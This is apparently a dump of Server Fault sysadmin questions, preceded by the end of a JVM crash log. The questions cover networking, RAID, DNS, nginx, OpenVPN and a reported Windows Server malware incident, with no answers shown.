7f1692a70000-7f1692a78000 rw-s 00000000 08:01 1048622                    /tmp/hsperfdata_root/13956
7f1692a78000-7f1692a79000 ---p 00000000 00:00 0 
7f1692a79000-7f1692a7c000 ---p 00000000 00:00 0 
7f1692a7c000-7f1692b7d000 rw-p 00000000 00:00 0 
7f1692b7d000-7f1692b81000 r--s 0003a000 08:01 662528                     /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext/sunpkcs11.jar
7f1692b81000-7f1692b82000 r--s 0000d000 08:01 662526                     /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext/sunec.jar
7f1692b84000-7f1692b85000 r--p 00023000 08:01 524356                     /lib/x86_64-linux-gnu/ld-2.24.so
7f1692b85000-7f1692b86000 rw-p 00024000 08:01 524356                     /lib/x86_64-linux-gnu/ld-2.24.so
7f1692b86000-7f1692b87000 rw-p 00000000 00:00 0 
7ffcc90b8000-7ffcc90d9000 rw-p 00000000 00:00 0                          [stack]
7ffcc91ce000-7ffcc91d0000 r--p 00000000 00:00 0                          [vvar]
7ffcc91d0000-7ffcc91d2000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]

VM Arguments:
jvm_args: -Xmx5300M -Xms5300M 
java_command: paper-204.jar
java_class_path (initial): paper-204.jar
Launcher Type: SUN_STANDARD

Environment Variables:
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
USERNAME=root
SHELL=/bin/bash

Signal Handlers:
SIGSEGV: [libjvm.so+0xa7e790], sa_mask[0]=11111111011111111101111111111110, sa_flags=SA_RESTART|SA_SIGINFO
SIGBUS: [libjvm.so+0xa7e790], sa_mask[0]=11111111011111111101111111111110, sa_flags=SA_RESTART|SA_SIGINFO
SIGFPE: [libjvm.so+0x8c2660], sa_mask[0]=11111111011111111101111111111110, sa_flags=SA_RESTART|SA_SIGINFO
SIGPIPE: [libjvm.so+0x8c2660], sa_mask[0]=11111111011111111101111111111110, sa_flags=SA_RESTART|SA_SIGINFO
SIGXFSZ: [libjvm.so+0x8c2660], sa_mask[0]=11111111011111111101111111111110, sa_flags=SA_RESTART|SA_SIGINFO
SIGILL: [libjvm.so+0x8c2660], sa_mask[0]=11111111011111111101111111111110, sa_flags=SA_RESTART|SA_SIGINFO
SIGUSR1: SIG_DFL, sa_mask[0]=00000000000000000000000000000000, sa_flags=none
SIGUSR2: [libjvm.so+0x8c2510], sa_mask[0]=00000000000000000000000000000000, sa_flags=SA_RESTART|SA_SIGINFO
SIGHUP: [libjvm.so+0x8c2b80], sa_mask[0]=11111111011111111101111111111110, sa_flags=SA_RESTART|SA_SIGINFO
SIGINT: [libjvm.so+0x8c2b80], sa_mask[0]=11111111011111111101111111111110, sa_flags=SA_RESTART|SA_SIGINFO
SIGTERM: [libjvm.so+0x8c2b80], sa_mask[0]=11111111011111111101111111111110, sa_flags=SA_RESTART|SA_SIGINFO
SIGQUIT: [libjvm.so+0x8c2b80], sa_mask[0]=11111111011111111101111111111110, sa_flags=SA_RESTART|SA_SIGINFO


---------------  S Y S T E M  ---------------

OS:PRETTY_NAME=&quot;Debian GNU/Linux 9 (stretch)&quot;
NAME=&quot;Debian GNU/Linux&quot;
VERSION_ID=&quot;9&quot;
VERSION=&quot;9 (stretch)&quot;
VERSION_CODENAME=stretch
ID=debian
HOME_URL=&quot;https://www.debian.org/&quot;
SUPPORT_URL=&quot;https://www.debian.org/support&quot;
BUG_REPORT_URL=&quot;https://bugs.debian.org/&quot;

uname:Linux 4.9.0-13-amd64 #1 SMP Debian 4.9.228-1 (2020-07-05) x86_64
libc:glibc 2.24 NPTL 2.24 
rlimit: STACK 8192k, CORE 0k, NPROC 23800, NOFILE 1048576, AS infinity
load average:0.24 0.21 0.18

/proc/meminfo:
MemTotal:        6115244 kB
MemFree:          113056 kB
MemAvailable:          0 kB
Buffers:             652 kB
Cached:            67572 kB
SwapCached:            0 kB
Active:          5860044 kB
Inactive:          65516 kB
Active(anon):    5857608 kB
Inactive(anon):    62880 kB
Active(file):       2436 kB
Inactive(file):     2636 kB
Unevictable:           0 kB
Mlocked:               0 kB
SwapTotal:             0 kB
SwapFree:              0 kB
Dirty:                88 kB
Writeback:             0 kB
AnonPages:       5857424 kB
Mapped:            10132 kB
Shmem:             63064 kB
Slab:              22556 kB
SReclaimable:       9584 kB
SUnreclaim:        12972 kB
KernelStack:        2576 kB
PageTables:        14336 kB
NFS_Unstable:          0 kB
Bounce:                0 kB
WritebackTmp:          0 kB
CommitLimit:     3057620 kB
Committed_AS:    6289780 kB
VmallocTotal:   34359738367 kB
VmallocUsed:           0 kB
VmallocChunk:          0 kB
HardwareCorrupted:     0 kB
AnonHugePages:         0 kB
ShmemHugePages:        0 kB
ShmemPmdMapped:        0 kB
HugePages_Total:       0
HugePages_Free:        0
HugePages_Rsvd:        0
HugePages_Surp:        0
Hugepagesize:       2048 kB
DirectMap4k:      104436 kB
DirectMap2M:     6187008 kB
DirectMap1G:     2097152 kB

container (cgroup) information:
container_type: cgroupv1
cpu_cpuset_cpus: 0-1
cpu_memory_nodes: 0
active_processor_count: 2
cpu_quota: -1
cpu_period: 100000
cpu_shares: -1
memory_limit_in_bytes: -1
memory_and_swap_limit_in_bytes: -2
memory_soft_limit_in_bytes: -1
memory_usage_in_bytes: 6068023296
memory_max_usage_in_bytes: 0


CPU:total 2 (initial active 2) (1 cores per cpu, 2 threads per core) family 6 model 79 stepping 0, cmov, cx8, fxsr, mmx, sse, sse2, sse3, ssse3, sse4.1, sse4.2, popcnt, avx, avx2, aes, clmul, erms, rtm, 3dnowpref, lzcnt, ht, tsc, tscinvbit, bmi1, bmi2, adx

/proc/cpuinfo:
processor   : 0
vendor_id   : GenuineIntel
cpu family  : 6
model       : 79
model name  : Intel(R) Xeon(R) CPU @ 2.20GHz
stepping    : 0
microcode   : 0x1
cpu MHz     : 2200.000
cache size  : 56320 KB
physical id : 0
siblings    : 2
core id     : 0
cpu cores   : 1
apicid      : 0
initial apicid  : 0
fpu     : yes
fpu_exception   : yes
cpuid level : 13
wp      : yes
flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss ht syscall nx pdpe1gb rdtscp lm constant_tsc rep_good nopl xtopology nonstop_tsc pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch invpcid_single ssbd ibrs ibpb stibp kaiser fsgsbase tsc_adjust bmi1 hle avx2 smep bmi2 erms invpcid rtm rdseed adx smap xsaveopt arat md_clear arch_capabilities
bugs        : cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs taa
bogomips    : 4400.00
clflush size    : 64
cache_alignment : 64
address sizes   : 46 bits physical, 48 bits virtual
power management:

processor   : 1
vendor_id   : GenuineIntel
cpu family  : 6
model       : 79
model name  : Intel(R) Xeon(R) CPU @ 2.20GHz
stepping    : 0
microcode   : 0x1
cpu MHz     : 2200.000
cache size  : 56320 KB
physical id : 0
siblings    : 2
core id     : 0
cpu cores   : 1
apicid      : 1
initial apicid  : 1
fpu     : yes
fpu_exception   : yes
cpuid level : 13
wp      : yes
flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss ht syscall nx pdpe1gb rdtscp lm constant_tsc rep_good nopl xtopology nonstop_tsc pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch invpcid_single ssbd ibrs ibpb stibp kaiser fsgsbase tsc_adjust bmi1 hle avx2 smep bmi2 erms invpcid rtm rdseed adx smap xsaveopt arat md_clear arch_capabilities
bugs        : cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs taa
bogomips    : 4400.00
clflush size    : 64
cache_alignment : 64
address sizes   : 46 bits physical, 48 bits virtual
power management:



Memory: 4k page, physical 6115244k(112932k free), swap 0k(0k free)

vm_info: OpenJDK 64-Bit Server VM (25.265-b01) for linux-amd64 JRE (1.8.0_265-8u265-b01-0+deb9u1-b01), built on Aug 12 2020 08:17:29 by &quot;buildd&quot; with gcc 6.3.0 20170516

time: Sun Sep 27 01:45:57 2020
timezone: UTC
elapsed time: 32155 seconds (0d 8h 55m 55s)


</code></pre>
","<linux><virtual-machines><google-cloud-platform><memory><java>","2020-09-27 11:48:25"
"967264","See someone unused environment variable","<p>Let's say I log in as <strong>Bob</strong> to host <strong>server</strong>.
Then i do :</p>

<pre><code>export MYSEC='secret'
</code></pre>

<p>Let's say Alice has access to the same host and also sudo permissions.</p>

<p>How can Alice see the value of MYSEC?</p>

<p>Note : let's say Bob never closes the session so the value remains there and we allow Alice to work</p>
","<environment-variables>","2019-05-14 19:21:51"
"967287","How much outgoing traffic would a HTTP load balance use?","<p>I'm setting up HTTP load balancers for Tomcat servers. I'm looking at a few different VPS plans that the load balancer will run on. I assume the load balancer would use very small amounts of traffic? If a website gets about 4 Million visits a month, how much bandwidth can I expect the load balancer to use?</p>
","<load-balancing>","2019-05-14 23:12:01"
"967327","How to redirect multiple domain to same ip but different port for different services","<p>In my VM, i'm running both <code>apache2</code> and <code>nginx</code>, but apache2 is pointed to Port 8080 and nginx is Port 80. Already i pointed my domain to ip in nginx and its running properly. The same thing i need to do for apache2. But how will i give <code>Port number</code> while <code>mapping the ip to Domain</code>. In the cName record, i'm not able to specify the port. Is there any alternative way to resolve this issues.</p>
","<apache-2.2><nginx><azure><subdomain><mapping>","2019-05-15 07:37:14"
"1036020","Connecting MongoDB Compass to WSL2 Mongo server","<p>I am running a mongoDB server on Ubuntu via Windows Subsystem for Linux 2. (Windows build is 19041.) I have MongoDB Compass running on Windows, and it is happy to connect to my Mongo server in Windows, but I can't figure out how to give it access to the server in the subsystem. How can I accomplish this?</p>
","<mongodb><windows-subsystem-for-linux>","2020-10-01 16:04:19"
"967430","Creating an OLAP data warehouse from an OLTP AWS RDS","<p>I have an OLTP AWS RDS(in postgresql and very normalized) that powers an application. I am trying to create a separate data warehouse(OLAP use case) also in AWS RDS(postgresql) using a star shchema. I am not considering redshift as it is more expensive and the amount of data does not warrant it. As an AWS newbie, my question is are there certain tool within the AWS stack that will allow me to build a data warehouse type RDS based of off an OLTP RDS? Any suggestions regarding data copying/data syncing between two RDSs etc. is of great help. </p>
","<amazon-web-services><postgresql><amazon-rds><data-warehouse>","2019-05-15 17:43:56"
"1036163","Laravel websockets package connection refused?","<p>I using laravel websocket package aspusher replacement. First this ubuntu was not allowing to access the port <code>6001</code> then I add Inboud securoty group rule on aws . Now it is allowing to access the port but still not allowing to flow data thorug these porst and return this error.</p>
<pre><code>pusher.min.js:8 WebSocket connection to 'ws://52.64.101.38:6001/app/ABCDEF?protocol=7&amp;client=js&amp;version=4.3.1&amp;flash=false' failed: Error in connection establishment: net::ERR_CONNECTION_REFUSED
</code></pre>
<p>I think I need to do more settings on aws but what I don't know.</p>
<p>It is also giving Authentication errors see screenshot
<a href=""https://i.sstatic.net/7UmUi.png"" rel=""nofollow noreferrer"">See the image</a></p>
","<php><websocket><laravel>","2020-10-02 16:19:56"
"967553","Using e-mail on malware infected computer/network","<p>I have an important (+10 outlook accounts) but very ignorant client who refuses to accept that there is malware on the company's computers. Malware that steals Outlook data to send and receive spam. The situation went on a limit, due to the stubbornness of the client and with that I decided to raise the anti-spam filter. That started to make the customer more satisfied because he no longer receives return messages associated with the malware (lots of Chinese messages). It is not a sustainable situation because normal messages are being filtered.</p>

<p>Any suggestions (without being rid of the client), please?</p>

<p>PS: I'm not the network administrator of this company (who thinks just like the customer!) just the website and email service provider.</p>
","<ssl><smtp><imap><malware><pop3>","2019-05-16 10:13:56"
"967561","Crontab entry executing every hour","<p>What does this line mean in /etc/crontab file ?</p>

<pre><code>59  *  * * *    root    rm -f /var/spool/cron/lastrun/cron.hourly
</code></pre>
","<cron><cron.daily>","2019-05-16 10:38:28"
"1036318","File size changes after downloading from online server to hard disk. What causes this?","<p>I need clear explanation about this subject. From my online server I downloaded a file (.htaccess) for this I use Filezilla as FTP client.
After downloading the file I noticed that the filesize had increased from 482 to 496 kb. What causes this change in filesize?</p>
<p>I did the following research in google:
“filesize changes after download from server site:stackoverflow.com”
“filesize changes after download from server site:serverfault.com”</p>
<p>The reason I ask this here is because my problem might be specific regarding Filezilla , my serverprovider and my desktop harddisk settings.</p>
","<ftp>","2020-10-04 09:12:16"
"915373","Supervisord - Supervisor exit status 255 not expected on A","<p>I have no clue why this always happened. I tried to reload the supervisord process but still doesnt the same error appears</p>

<p>The error show this..</p>

<p><a href=""https://i.sstatic.net/TGep9.png"" rel=""nofollow noreferrer"">FATAL      Exited too quickly (process log may have details)</a></p>

<p>and the supervisord.conf</p>

<p><a href=""https://i.sstatic.net/kbKlo.png"" rel=""nofollow noreferrer"">Supervisor config file</a></p>
","<linux><php><unix><supervisord><gearman>","2018-06-06 03:36:23"
"1036383","Web server with a private IP","<p>I need an explanation of how to establish tcp/ip connection to two web servers that are on a remote lan network. The web servers have a private IP addresses.</p>
<p>Let say of the sites is <a href=""https://justanexplanation.org"" rel=""nofollow noreferrer"">https://justanexplanation.org</a></p>
<p>Will DNS return to me a public address of the router/lan where servers sits? As far as know this is the only address that dns can know.</p>
<p>But, how the de-encapsulation will continue than if I only know public ip, how the 'destination' lan knows which server is right for this connection since both operate on port 80.</p>
<p>I am confused.</p>
<p>Thanks</p>
","<networking><firewall><router><nat><local-area-network>","2020-10-04 20:49:03"
"967734","HP DL360 G7 Smart Array P410i drive mix","<p>i have HP DL360 G7 Smart Array P410i with 3xSAS HDD 146 GB in RAID5.
I decided to change hard drives to SSD ones (3x180 Intel SSD).
My idea was to change drives one by one and wait for RAID rebuilds.</p>

<p>However, i got this
<a href=""https://i.sstatic.net/b8uO4.jpg"" rel=""nofollow noreferrer"">error</a></p>

<p>i suppose reason is type 
<a href=""https://i.sstatic.net/GBEjE.png"" rel=""nofollow noreferrer"">mix</a></p>

<p>so my question is - maybe there is some workaround, how to force RAID rebuild without new RAID creation on new SSD's and system installation/restore.</p>

<p>any advice is appreciated, thanks!</p>
","<raid><hp-proliant><ssd>","2019-05-17 08:50:33"
"967788","routing from multiple NICs having the same address","<p>I tried this question on NetworkEngineering StackExchange and they rejected, referring me to Serverfault. Serverfault rejected an earlier version of this, referring me to StackExchange. It's time to stop passing the buck. This is a real question about a real network admin setting. 
 <a href=""https://networkengineering.stackexchange.com/questions/59210/routing-with-multiple-nics-connected-to-multiple-aps-that-were-all-assigned-th?noredirect=1#comment104630_59210"">https://networkengineering.stackexchange.com/questions/59210/routing-with-multiple-nics-connected-to-multiple-aps-that-were-all-assigned-th?noredirect=1#comment104630_59210</a></p>

<p>The situation:</p>

<p>I have 4 wireless APs based on the ESP8266. These APs all broadcast distinct SSIDs, but each serves LAN addresses in subnet 192.168.4.XXX. The subnet value is not configurable.</p>

<p>Then, I have a Linux host with 4 wireless NICs. I can make each NIC connect as a client of a different AP. NIC#1 one is connected to AP#1 ... NIC#4 is connected to AP#4. Because all APs serve up .4 addresses, there is a chance that all 4 NIC will get assigned the same IP, e.g. all 4 NICs might be assigned 192.168.4.101.</p>

<p>Each of the APs has other devices connected to them, besides the dedicated host NIC. All devices are given addresses on the .4 network. For example, there might be a printer on AP#2 with IP 192.168.4.102 and a scanner connected to AP#4 also with IP 192.168.4.102.</p>

<p>The question:</p>

<p>Is there any way that networking on the Linux host can be made to work?</p>

<p>Specifically in the above example, how might one address (read data from/write data to) the printer versus the scanner?</p>

<p>Thanks, Bilal</p>
","<routing><linux-networking><dhcp>","2019-05-17 14:40:54"
"842556","Is a smartphone recognized as a smartphone when connected to wifi? If so, how can I avoid that?","<p>So I wanted to know if when I connected my iPhone to a wireless connection, the router or device that shares the connection is able to recognize my iPhone as an iPhone. I mean are all smartphones ""registered"" or read as smartphones under the provider's wifi?</p>

<p>I know that with an ip address it's pretty impossible to determine what machine or computer it corresponds to. Either way, if it can determine that, how can I change it so that the smartphone can't be recognized as that?</p>
","<wifi><connection><iphone><smartphone>","2017-04-04 17:41:20"
"915750","Mediawiki file upload final steps fail","<p>I have a mediawiki set up on an IIS7 server. It was set up as described in the manual. I activated file upload as described <a href=""https://www.mediawiki.org/wiki/Manual:Configuring_file_uploads"" rel=""nofollow noreferrer"" title=""here"">here</a>. I think I've got the folder permissions right: modify-read-write for the <code>IIS_IUSRS</code> group on the <code>images</code> subdir of the mediawiki install. My <code>php.ini</code> also allows file uploads.</p>

<p>When I try to upload a png image, I can see a temporary file with a name of <code>phpF267.tmp</code> being created in a temp folder that is obviously a png file (magic header). However, Mediawiki tells me that it was unable to open the lock file for <code>mwstore://local-backend/local-public/f/f1/bla.png</code> and does not copy the file. It does not even create the directories <code>f/f1</code> in the <code>images</code> folder.</p>

<p>Any ideas what might be wrong?</p>
","<php><iis-7><mediawiki>","2018-06-08 09:36:10"
"915794","Destination Host Unreachable - routing?","<p>This is the routing table on machine with ip 188.165.246.xxx.
The problem is local network coming in via 10.10.10.0 fails to be forwarded to internet.</p>

<pre><code>route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         188.165.246.xxx 0.0.0.0         UG    0      0        0 eno1
0.0.0.0         188.165.246.xxx 0.0.0.0         UG    0      0        0 vmbr0
10.10.10.0      0.0.0.0         255.255.255.0   U     0      0        0 vmbr1
188.165.246.0   0.0.0.0         255.255.255.0   U     0      0        0 eno1
188.165.246.0   0.0.0.0         255.255.255.0   U     0      0        0 vmbr0
</code></pre>

<p>This is a ping from 10.10.10.10</p>

<pre><code>ping 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
From 10.10.10.1 icmp_seq=1 Destination Host Unreachable
From 10.10.10.1 icmp_seq=2 Destination Host Unreachable
</code></pre>

<p>Is it a case of another route needs to be added if so what?</p>
","<networking>","2018-06-08 15:04:18"
"968195","Is possible to enable Hyper-V using nested virtualization with Windows 7 as host?","<p>I'm tying to use docker on windows 10 virtual machine instaled on windows 7 host. I  manually enabled Hyper-V on VM, but when I try to start docker it return error</p>

<p><em>The running command stopped because the preference variable ""ErrorActionPreference"" or common parameter is set to Stop: 'MobyLinuxVM' failed to start. ailed to start the virtual machine 'MobyLinuxVM' because one of the Hyper-V components is not running.</em></p>

<p>As I understand it, VM still can't use Hyper-V. I know that is possible to enable Hyper-V on VM with nested virtualization, but I don't know if it is possible with not win10 as bare metal OS.</p>
","<windows><virtualization><docker><hyper-v>","2019-05-21 09:33:03"
"968259","Hybrid RAID (SDD+HDD) gives unexpected results","<p>I am doing some experiments with hybrid RAID in Linux.
My test consists of the following:</p>

<p>2x256GB SSD in RAID 0 (/dev/md1)</p>

<p>2x256GB HDD in RAID 0 (/dev/md2)</p>

<p>Then I made md1 and md2 into a RAID 1 (/dev/md127) and marking the slow HDD (md2) as --write-mostly.</p>

<p>Essentially, my goal is to get maximum performance AND disk space out of my SSDs, but at the same time be ""safe"" from drive failures. I understand that loosing one of the SSDs would mean that I fall back on slow HDDs, but that's a price I am willing to pay compared to loosing all data. Besides, it would only be for a few hours until the broken SSDs gets replaced and RAID repaired.</p>

<pre><code>root@s1 / # cat /proc/mdstat
Personalities : [raid0] [raid1] [linear] [multipath] [raid6] [raid5] [raid4] [raid10]

md2 : active raid0 sdd1[1] sdc1[0]
      498802688 blocks super 1.2 512k chunks

md127 : active raid1 md1[2] md2[1](W)
      498671616 blocks super 1.2 [2/2] [UU]
      bitmap: 1/4 pages [4KB], 65536KB chunk

md1 : active raid0 sdb2[1] sda2[0]
      498802688 blocks super 1.2 512k chunks

</code></pre>

<p>Now, running a simple throghput benchmark on the 3 raid devices gives a (for me) surprising results:</p>

<pre><code>root@s1 / # hdparm -t /dev/md1

/dev/md1:
 Timing buffered disk reads: 2612 MB in  3.00 seconds = 870.36 MB/sec
root@s1 / # hdparm -t /dev/md2

/dev/md2:
 Timing buffered disk reads: 812 MB in  3.01 seconds = 270.14 MB/sec
root@s1 / # hdparm -t /dev/md127

/dev/md127:
 Timing buffered disk reads: 1312 MB in  3.00 seconds = 437.33 MB/sec
</code></pre>

<p>RAID 0 SSD gives 870 MB/sec</p>

<p>RAID 0 HDD gives 270 MB/sec</p>

<p>RAID 1 HYBRID gives 437 MB/sec.</p>

<p>As the HDD raid has been marked as --write-mostly, I would assume that a pure read test would not touch the HDD at all, so what is going on here? I would assume that the hybrid benchmark would give similar results as the pure RAID 0 SSD.</p>

<p>At a first glance, it looks like the HDD somehow is slowing down the RAID, by being partly used for the read (even though I told it not to do reads on the HDD). However, if I have a file copy running on the HDDs while running the hdparm benchmark, I get the same result! If the HDDs WERE used, I would assume the benchmark would give even slower results if the HDDs were used for other tasks during the benchmark.</p>

<p>I hope some Linux raid expert can shed some light to my problem. Thanks!</p>
","<linux><raid><mdadm>","2019-05-21 17:04:02"
"916019","A record showing wrong IP address on DNS lookup for my domain name","<p>Hi I have registered a domain qualebs.com on godaddy.com
It has been working well for 2years now. Today I made a payment for its renewal. Since then I have not been able to access my website. Any attempt leaves me with the dreaded vague godaddy messages <code>This website is temporarily unavailable, please try again later.</code></p>

<p>I have my A record pointing to my VS ip address hosted at eapps.com
I don't know what to do and unfortunately customer care for godaddy is always offline please help</p>
","<domain-name-system><a-record>","2018-06-10 21:57:25"
"1036859","Is it possible to backdate an Ubuntu restore to trick an expired password prompt","<p>I use passwordless login with SSH to access my Ubuntu 18.04 DigitalOcean droplet, on which I've disabled root login, using a sudo-enabled account. I do not have a login password/sudo password. My password setting is <code>ALL=(ALL) NOPASSWD: ALL</code>, so that I never have to enter one.</p>
<p>However, I tried logging in to my droplet today and it told me my non-existent password is expired. It wants the current password to change the password. But...I don't have a current password.</p>
<p>As I said, the root login is disabled, so I have no other way in. I assume I'm screwed, unless you know of a way I can remotely login bypassing the expired password check.</p>
<p>The only other thing I can think of is if I can restore a backup of the server but backdate it during restoration by 30 days or whatever, so that it thinks my password is still valid. Is it possible to do that, even if it means only a higher level of support has to do it for me?</p>
","<linux><ubuntu><ssh><digital-ocean><password-recovery>","2020-10-08 03:57:07"
"968467","How to use Nginx reverse proxy to connect a public server to internal server?","<p>I am currently working on a site that is hosted from a server running in my home. Here is the setup:</p>

<ol>
<li>Server running ESXi, two virtual machines</li>
<li>First virtual machine is connected publicly to the internet under a DDNS. It is running Nginx and will serve to proxy requests from the public internet to the servers that are on internal IP addresses only</li>
<li>I am performing a Wordpress installation on the internal server</li>
</ol>

<p>Here is the Nginx config:</p>

<pre><code>server {
    listen 80;
    server_name mydomain.com;
    location / {
        proxy_pass http://192.168.1.23/;
    }
}

server {
    listen 443;
    server_name mydomain.com;
    location / {
        proxy_pass http://192.168.1.23/;
    }
}
</code></pre>

<p>These ports are forwarded on the home network, and that works. Here's the issue - when I try to load the site outside of my home network it seems to be making a redirect to the internal IP address (<a href=""http://192.168.1.23"" rel=""nofollow noreferrer"">http://192.168.1.23</a>) which is obviously failing, and not what I want it to do.</p>

<p>I want it to proxy all requests through the proxy server, which is set up to access the public internet. Any thoughts as to why this is happening?</p>
","<ubuntu><nginx><reverse-proxy><wordpress>","2019-05-22 18:05:37"
"968483","Ensuring network drives are mounted before performing a backup","<p>I'm trying to write a backup script that can be deployed on many different linux servers, some of which mount network drives as described in /etc/fstab. I want my script to be able to see if any network drives have come unmounted before a backup to ensure that they don't go unsaved. Is there any way to reliably check for this in a bash script?</p>
","<backup><bash><scripting>","2019-05-22 20:47:18"
"968666","Is there such a Chef service that managed by K8s?","<p>I'm looking for a way to manage a Chef into my K8s cluster.
My cluster is scaling up and down and I need a way to bootstrap different dependencies for each new node in the namespace.
My nodes are in AWS cloud and I'm aware for the userData but it's not enough and Chef has other purposes and advantages.</p>

<p>The goal is not just having Chef as a pod in K8s but also to have the tools to manipulate different rules over my cluster.</p>
","<kubernetes><chef><configuration-management>","2019-05-24 08:11:39"
"1037075","Hack attempt Windows Server 2019","<p>I have a Windows Server 2019 VPS for hosting websites. It has all the latest updates. But somehow there is a (partial) hacking attempt. I first noticed it by the SMS I got for high CPU usage of the Microsoft Register Server (regsvr32.exe). With the help of <a href=""https://www.techcrises.com/windows-10/microsoft-register-server-regsvr32-exe/"" rel=""nofollow noreferrer"">this site</a> and <a href=""https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer"" rel=""nofollow noreferrer"">Process Explores</a> that the cause was a DLL in the <code>ProgramDAta</code> folder.</p>
<p>There I found a zip with the name <code>set.zip</code>. Containing the following 5 files. <code>comhij.dll</code>, <code>let.exe</code>, <code>rn.bat</code>, <code>x.mof</code> and <code>xg.dll</code>. Is seems that the .bat file got executed and was running the script. But it failed somehow, maybe Windows Defender or something else was blocking it causing the high CPU. I know this because the last lines in the .bat causes it to delete itself. And I could not find any of the changes the script wanted to make.</p>
<p>I copied the zip to my own PC, and Norton 360 immediately identified the let.exe as Hacktool, the comhij.dll as Trojan Horse and xg.dll as Trojan.Get.MTB.</p>
<p>The Server has the Windows Firewall active and at the provider level <a href=""https://www.transip.nl/"" rel=""nofollow noreferrer"">TransIP</a> there is also a Firewall active.</p>
<p>I was able to find out that the <code>set.zip</code> was created by one of the AppPools (hosting a <a href=""https://www.dnnsoftware.com/"" rel=""nofollow noreferrer"">DotNetNuke CMS</a> if that matters) with no FTP access.</p>
<p>So my question is how to find out how this happened and how I can prevent it in the future? And how an AppPool can write a file to disk outside it's root directory?
On request I could post the entire .bat script.</p>
","<vps><hosting><hacking><windows-server-2019><iis-10>","2020-10-09 13:01:50"
"916341","Is it possible to procure an Amazon S3 instance on dedicated physical hardware?","<p>The title pretty much says it all. We're looking for a simple way to set up an SFTP site – but, for security reasons, it can't live on hardware that's shared with other clients.</p>

<p>Does Amazon offer S3 instances that live on dedicated hardware? I've looked on their site, and I see that you can get dedicated <em>EC2</em> instances (for an arm an a leg) – but I couldn't find anything about dedicated S3 instances.</p>

<p>Thanks!</p>
","<amazon-web-services><amazon-s3>","2018-06-12 21:40:34"
"916461","What is the best way of testing million concurrent requests?","<p>I have currently set up a Docker Swarm that has containers with node.js servers running in it. I am going to try different setups with different amount of node.js containers and see how long it takes to upload json data to servers. My purpose is to a cluster that can handle some stress.</p>

<p>I want to test million concurrent requests and see how server performs. I have currently tried tool called ab (Apache Benchmark) but it was not possible to create million connections with it. I also tried tool called siege but got following:</p>

<pre><code>[fatal] unable to allocate memory for 1000000 simulated browser: Resource temporarily unavailable
</code></pre>

<p>What would you recommend me to use with this? Also is there something special I need to take into account in design side?</p>
","<linux><docker><node.js><stress>","2018-06-13 13:46:03"
"842803","Traffic not routed through OpenVPN properly","<p>I have the following problem:
I am running an OpenVPN Server on my Debian 8 VPS. 
Everything is working fine except for one thing:
All traffic to any server is completely routed through tun0 (according to traceroute), but any traffic to the external IP of my server (173.212.###.220, not the VPN internal one) is not.</p>

<p>Traceroute to google.com:</p>

<pre><code>traceroute to google.com (172.217.23.174), 30 hops max, 60 byte packets
1  10.8.0.1 (10.8.0.1)  39.808 ms  39.866 ms  40.808 ms
2  ip-1-90-136-213.static.contabo.net (213.136.90.1)  43.087 ms 43.302 ms  43.267 ms
3  de-cix10.net.google.com (80.81.192.108)  55.582 ms  56.259 ms 57.598 ms
4  64.233.174.25 (64.233.174.25)  55.380 ms 64.233.174.255 (64.233.174.255)  59.579 ms  60.960 ms
5  216.239.47.245 (216.239.47.245)  58.919 ms  59.996 ms 216.239.47.247 (216.239.47.247)  60.717 ms
6  fra15s22-in-f174.1e100.net (172.217.23.174)  65.493 ms  49.944 ms  50.290 ms
</code></pre>

<p>Traceroute to 173.212.###.220:</p>

<pre><code>traceroute to #######.de (173.212.###.220), 30 hops max, 60 byte packets
1  gateway (192.168.1.1)  0.264 ms  0.349 ms  0.472 ms
2  * * *
3  * * *
4  * * *
5  * * *
6  * * *
7  * * *
8  * * *
9  mail.#######.de (173.212.###.220)  44.989 ms  45.009 ms  45.238 ms
</code></pre>

<p>Why is that? I mean, why is everything routed through the VPN except for traffic to and from the VPN server itself?</p>
","<networking><debian><vpn><openvpn><tunneling>","2017-04-05 16:09:23"
"968871","linux servers configuration management best practice","<p>I have a bunch of servers where I periodically need to perform various operations, such as adding new repositories, installing packages, changing a couple of lines in configuration files, what approaches exist to propagate such changes? Which are the most convenient and simple?</p>
","<linux><configuration-management>","2019-05-26 07:34:39"
"916589","300' Fiber Optic Cable not passing Data","<p>Just installed a 350' Fiber Optic cable for a client. Customers IT company came in to install the AT&amp;T router and said the fiber optic cable is not working.
IT company installed the router with a short patch panel cable at the junction block and said the router was working.
We do not have sophisticated test equipment so we used a very bright flashlight and were able to see light in the fiber optic cable (Single Mode LC).
Is it possible AT&amp;T needs to boost the signal for this distance?
Is there a cost effective way to test the cable without expensive test equipment? Cable was purchased pre-terminated and passed internal testing.
We are new to the fiber optic side and install mostly ethernet cabling systems so please forgive our limited knowledge. We tried searching many forums but there is limited information that is more confusing than helpful.</p>
","<testing><cable><fiber>","2018-06-14 04:40:28"
"968985","OpenVPN over stunnel not working when forwarded through router but working internally","<p>I'm trying to set up OpenVPN over stunnel on my personal server. </p>

<p>openvpn is in tcp and connects fine outside of stunnel, even when connecting through a port forward on the router. </p>

<p>OpenVPN wrapped in stunnel works fine when not connecting through the port forward on the router, i.e. stunnel sends to internal IP address. </p>

<p>stunnel appears to be working fine when connecting through a forwarded port on the router, I set up an stunnel for SSH and that connects fine, I even left it in a while loop outputting to the console for a couple of minutes to see if if would fail. </p>

<p>However, when running openVPN over stunnel and through a port forward on the router the connection appear to set up but then drops and I can't get web traffic. </p>

